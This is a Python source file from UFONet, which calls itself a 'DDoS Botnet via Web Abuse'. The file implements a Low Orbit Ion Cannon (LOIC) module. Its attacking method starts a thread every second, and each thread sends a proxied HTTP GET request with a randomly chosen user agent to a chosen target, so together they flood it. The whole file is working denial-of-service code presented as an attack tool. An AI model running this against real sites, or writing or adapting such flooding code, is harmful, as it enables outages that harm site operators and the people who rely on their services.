#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS Botnet via Web Abuse - 2017 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import requests, random, threading, time

# UFONet DoS Web LOIC (Low Orbit Ion Cannon)
def ionize(self, target, proxy):
    try:
        proxyD = { 
              "http"  : proxy, 
            }
        self.user_agent = random.choice(self.agents).strip()
        headers = {'User-Agent': str(self.user_agent)}
        requests.get(target, headers=headers, proxies=proxyD)
        print "[Info] Firing 'pulse' from: LOIC -> Status: HIT!"
    except:
        print("[Error] LOIC is failing to engage. Is still our target online?...")
        pass

class LOIC(object):
    def __init__(self):
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)

    def attacking(self, target, requests, proxy):
        print "\n[Info] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , requests, "pulses ]\n"
        for i in range(0, int(requests)): 
            t = threading.Thread(target=ionize, args=(self, target, proxy)) # attack with LOIC using threading
            t.daemon = True
            t.start()
            time.sleep(1)
